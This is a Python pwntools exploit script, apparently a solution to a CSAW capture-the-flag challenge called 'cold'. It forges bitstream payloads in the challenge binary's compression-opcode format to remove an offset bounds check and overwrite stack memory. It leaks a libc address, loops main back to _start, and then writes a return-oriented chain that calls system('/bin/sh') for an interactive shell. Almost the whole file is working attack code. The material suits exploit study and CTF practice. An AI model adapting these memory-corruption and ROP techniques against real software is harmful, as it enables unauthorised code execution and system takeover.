#!/usr/bin/env python3

from pwn import *

the_binary = "./cold"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("pwn.chal.csaw.io", 5005)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # decompress return statement
        # pie break *0x23af

        # observing address of output bitstrem
        pie break *0x2336

        # offset value in repeat_bit opcode
        # pie break *0x22f8

        # start of repeat_bit opcode
        # pie break *0x22f8

        continue
    """)

class Opcodes:
    append_bit = 1
    append_bits = 2
    repeat_bit = 3
    seek = 4
    done = 0

class Payload:
    def __init__(self, size):
        self.bs = ""
        self._incomplete_byte = ""

        self._append(size, num_bits=0x14)

    def __bytes__(self):
        if self._incomplete_byte:
            last_byte = "0"*(8 - len(self._incomplete_byte)) + self._incomplete_byte
        else:
            last_byte = ""

        full_bs = self.bs + last_byte
        return int(full_bs, 2).to_bytes(len(full_bs) // 8, "big")

    def __str__(self):
        return hexdump(bytes(self))

    def __len__(self):
        return len(bytes(self))

    def _append(self, value, num_bits, pad=True):
        raw_bs = bin(value)[2:]
        assert len(raw_bs) <= num_bits

        if pad:
            raw_bs = "0"*(num_bits - len(raw_bs)) + raw_bs

        raw_bs = self._incomplete_byte + raw_bs
        self._incomplete_byte = ""

        while len(raw_bs) >= 8:
            chunk = raw_bs[:8]            
            raw_bs = raw_bs[8:]
            self.bs += "".join(reversed(chunk))

        if raw_bs:
            self._incomplete_byte = raw_bs

    def _append_opcode(self, opcode):
        self._append(opcode, num_bits=3)

    def append_bit(self, bit):
        self._append_opcode(Opcodes.append_bit)
        self._append(1, num_bits=1)

    def append_bits(self, bits):
        self._append_opcode(Opcodes.append_bits)
        self._append(bits, num_bits=8)

    def repeat_bit(self, offset, count):
        self._append_opcode(Opcodes.repeat_bit)
        self._append(offset, num_bits=0xa)
        self._append(count, num_bits=0xa)

    def seek(self, offset):
        self._append_opcode(Opcodes.seek)
        self._append(offset, num_bits=0x10)

    def done(self):
        self._append_opcode(Opcodes.done)

def send(payload):
    # Pad with return opcodes.
    for _ in range(5):
        payload.done()
    assert len(payload) <= 0x400
    io.sendafter("buffer:\n", bytes(payload))

def get_unbounded_payload():
    """Build a payload that has already removed the offset bounds checking.

    Bit offset will be at 0xc0 at the end of this function.

    """

    # Sufficiently small allocated size means the decompressed output string
    # uses an inline buffer, which resides on the stack behind important
    # metadata.
    p = Payload(size=8)

    # Overwrite the string_view size field to max uint64, so we can move the
    # offset freely without triggering the out of bounds sanity check.
    p.append_bit(1)
    p.repeat_bit(offset=1, count=0x40*3-1)

    return p

leak_payload = get_unbounded_payload()

# Move an address where it will be printed upon return from decompress.
leak_payload.seek(u16(p16(-0xc0, sign=True)))
leak_payload.repeat_bit(offset=0x68*8, count=0x40)

# Copy _start's address over the stored __libc_start_main address where main
# is supposed to return to; this allows us to send another payload after
# receiving our leak.
leak_payload.seek(0x50*8-0x40)
leak_payload.repeat_bit(offset=0x18*8, count=0x40)

send(leak_payload)

# Get libc leak; for some reason when we copy over the libc address from a
# negative offset, some of the bits get mangled. So, this leak isn't the most
# reliable, but it works often enough.
io.recvuntil("Output: ")
raw_leak = io.recvuntil("\n", drop=True)
libc_leak = u64(raw_leak.ljust(8, b"\x00"))
libc_leak = (libc_leak << 8) & 0x0000ffffffffffff
libc_leak |= 0x0000010000000000
log.info("libc leak: %#x" % libc_leak)
libc.address = libc_leak - 0x1c0a00
log.info("libc base: %#x" % libc.address)

rop_chain = flat(
    libc.address + 0x0000000000027f75,  # pop rdi
    next(libc.search(b"/bin/sh")),
    libc.sym.system
)
rop_payload = get_unbounded_payload()
rop_payload.seek(0x50*8-0xc0)
for b in rop_chain:
    rop_payload.append_bits(b)

send(rop_payload)
io.interactive()
